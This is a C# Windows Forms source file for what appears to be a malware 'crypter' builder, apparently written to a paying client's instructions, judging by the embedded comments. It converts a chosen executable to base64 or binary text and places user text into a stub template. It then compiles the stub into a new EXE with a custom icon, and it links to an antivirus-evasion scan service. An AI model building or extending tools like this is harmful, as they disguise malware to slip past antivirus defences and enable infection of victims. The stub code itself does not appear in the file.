using System;
using System.IO;
using Microsoft.VisualBasic;
using System.Windows.Forms;
using MaterialSkin.Controls;
using MaterialSkin;
using System.Reflection;
using System.Resources;
using WindowsFormsApp1.Resources;
using CrypterExample;
using System.Text;
using System.Threading.Tasks;

namespace WindowsFormsApp1
{
    public partial class Form1 : MaterialForm
    {


        public Form1()
        {

            InitializeComponent();
            var materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.AddFormToManage(this);
            materialSkinManager.Theme = MaterialSkinManager.Themes.LIGHT;
            materialSkinManager.ColorScheme = new ColorScheme(Primary.Green800, Primary.BlueGrey900, Primary.BlueGrey500, Accent.LightBlue200, TextShade.WHITE);
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void materialFlatButton1_Click(object sender, EventArgs e)
        {
            {
                var OpenFileDialog = new OpenFileDialog();
                OpenFileDialog.Title = "Load File EXE";
                OpenFileDialog.ShowDialog();
                textBox1.Text = OpenFileDialog.FileName;
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void materialFlatButton2_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(textBox1.Text))
            {
                Interaction.MsgBox("Please select a file", MsgBoxStyle.Critical);
            }
            else
            {
                richTextBox1.Text = Convert.ToBase64String(File.ReadAllBytes(textBox1.Text));
            }
        }

    
        // make it like this 
        // where?
      

        private void materialFlatButton1_Click_1(object sender, EventArgs e)
        {
            {
                var OpenFileDialog = new OpenFileDialog();
                OpenFileDialog.Title = "Load File EXE";
                OpenFileDialog.ShowDialog();
                textBox1.Text = OpenFileDialog.FileName;
            }
        }

        private void materialFlatButton3_Click(object sender, EventArgs e)
        {
            if (richTextBox1.Text == null)
            {
                Interaction.MsgBox("Please paste some base64 characters", MsgBoxStyle.Critical);
            }
            else
            {
                var SaveFile = new SaveFileDialog();
                SaveFile.Filter = "Exe Files (*.exe) | *.exe";
                if (SaveFile.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        File.WriteAllBytes(SaveFile.FileName, Convert.FromBase64String(richTextBox1.Text));
                        Interaction.MsgBox("Done", MsgBoxStyle.Information);
                    }
                    catch (Exception)
                    {
                        Interaction.MsgBox("Invalid base64 characters", MsgBoxStyle.Exclamation);
                    }
                }
            }
        }



        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://antiscan.me");
        }

        private void linkLabel1_LinkClicked_1(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://ghostbin.co");
        }

        private void materialFlatButton5_Click(object sender, EventArgs e)
        {

        }

        private void MaterialFlatButton4_Click(object sender, EventArgs e)
        {




            ///  make load resource string1 + textBox2

            string code = Resource1.String1;

            code = code.Replace("textBox2", textBox2.Text);

            ///  than compile to exe with codedomcompiler
            
            


            var SaveFile = new SaveFileDialog();
            SaveFile.Filter = "Exe Files (*.exe) | *.exe";
            if (SaveFile.ShowDialog() == DialogResult.OK)
            {
                try
                {


                    // ok, but time started now no just pay in 11:10 nevermind :) ok :)
                    // test code
                    // should add icon button make it work 
                    // because u see that save output - icon selected from open file dialog

                    //good but can you make it  add icon than save exe 


                    // test?
                    if (txtIcon.Text != string.Empty)
                    {
                        Compiler.CompileFromSource(code, SaveFile.FileName,  txtIcon.Text);
                    }
                    else
                    {
                        Compiler.CompileFromSource(code, SaveFile.FileName);
                    }
                    


                    Interaction.MsgBox("Done", MsgBoxStyle.Information);
                }
                catch (Exception)
                {
                    Interaction.MsgBox("Compile failed", MsgBoxStyle.Exclamation);
                }
            }
            
        }

        private void materialFlatButton5_Click_1(object sender, EventArgs e)
        {
            // like this - ok
            // this is how you call this method load from exe 

            if (string.IsNullOrEmpty(textBox1.Text))
            {
                Interaction.MsgBox("Please select a file", MsgBoxStyle.Critical);
            }
            else
            {
                richTextBox1.Text = Encrypt(File.ReadAllBytes(textBox1.Text));
            }
            // done? more please wait
        }

        public string Encrypt(byte[] V)
        {
            StringBuilder stringBuilder = new StringBuilder();
            int num1 = checked(V.Length - 1);
            int index = 0;
            while (index <= num1)
            {
                byte num2 = V[index];
                stringBuilder.Append(Convert.ToString(num2, 2).PadLeft(8, '0'));
                stringBuilder.Append(" ");
                checked { ++index; }
            }
            return stringBuilder.ToString().Substring(0, checked(stringBuilder.ToString().Length - 1));
        }

        private void materialFlatButton6_Click(object sender, EventArgs e)
        {

        }

        private void btnChooseIcon_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icon (*.ico)|*.ico";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtIcon.Text = openFileDialog.FileName;
                    pictureIcon.ImageLocation = openFileDialog.FileName;
                    pictureIcon.BorderStyle = BorderStyle.FixedSingle;
                }
                else
                {
                    txtIcon.Text = string.Empty;
                    pictureIcon.ImageLocation = string.Empty;
                }
            }
        }

        private void txtIcon_TextChanged(object sender, EventArgs e)
        {

        }
    }
}

